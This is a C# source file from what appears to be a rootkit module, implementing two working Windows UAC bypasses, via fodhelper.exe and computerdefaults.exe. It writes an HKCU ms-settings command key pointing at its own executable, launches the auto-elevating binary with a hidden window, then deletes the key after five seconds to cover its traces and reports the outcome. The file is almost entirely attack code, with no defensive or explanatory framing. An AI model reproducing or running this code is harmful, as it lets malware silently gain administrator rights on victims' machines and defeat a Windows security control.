using System;
using System.Diagnostics;
using Microsoft.Win32;
using System.Threading;
using XYZ.modules.reporters;

namespace XYZ.modules.rootkit
{
    public class UACBypassModule
    {
        /// <summary>
        /// Attempts to bypass UAC using the Fodhelper technique (Windows 10/11)
        /// requires the current user to be in the local Administrators group
        /// but running with medium integrity.
        /// </summary>
        public static bool ExecuteFodhelperBypass()
        {
            string method = "fodhelper";
            try
            {
                // Check if we are already elevated
                if (PrivilegeEscalationReporter.GetCurrentPrivilegeLevel() != "User")
                {
                    return true;
                }

                string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                
                // 1. Create registry structure
                // HKCU\Software\Classes\ms-settings\Shell\Open\command
                string keyPath = @"Software\Classes\ms-settings\Shell\Open\command";
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                {
                    if (key == null)
                    {
                        PrivilegeEscalationReporter.ReportUACBypass(method, false, "Failed to create registry key");
                        return false;
                    }

                    // Set default value to executable path
                    key.SetValue("", exePath);
                    // Set DelegateExecute to empty string (required for bypass)
                    key.SetValue("DelegateExecute", "");
                }

                // 2. Execute fodhelper.exe
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "fodhelper.exe",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true
                };

                Process.Start(psi);

                // 3. Cleanup after delay to ensure fodhelper reads the key
                // Run cleanup in background thread
                new Thread(() => {
                    try
                    {
                        Thread.Sleep(5000);
                        Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings");
                    }
                    catch { }
                }).Start();

                PrivilegeEscalationReporter.ReportUACBypass(method, true);
                return true;
            }
            catch (Exception ex)
            {
                try
                {
                    // Attempt cleanup on failure
                    Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings");
                }
                catch { }

                PrivilegeEscalationReporter.ReportUACBypass(method, false, ex.Message);
                return false;
            }
        }

        /// <summary>
        /// Attempts to bypass UAC using the ComputerDefaults technique
        /// </summary>
        public static bool ExecuteComputerDefaultsBypass()
        {
            string method = "computerdefaults";
            try
            {
                if (PrivilegeEscalationReporter.GetCurrentPrivilegeLevel() != "User") return true;

                string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                
                // Same registry key structure as fodhelper usually works for computerdefaults in some versions,
                // but standard ComputerDefaults bypass uses ms-settings as well.
                string keyPath = @"Software\Classes\ms-settings\Shell\Open\command";
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
                {
                    key.SetValue("", exePath);
                    key.SetValue("DelegateExecute", "");
                }

                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "computerdefaults.exe",
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true,
                    UseShellExecute = true
                };

                Process.Start(psi);

                new Thread(() => {
                    try
                    {
                        Thread.Sleep(5000);
                        Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings");
                    }
                    catch { }
                }).Start();

                PrivilegeEscalationReporter.ReportUACBypass(method, true);
                return true;
            }
            catch (Exception ex)
            {
                PrivilegeEscalationReporter.ReportUACBypass(method, false, ex.Message);
                return false;
            }
        }
    }
}
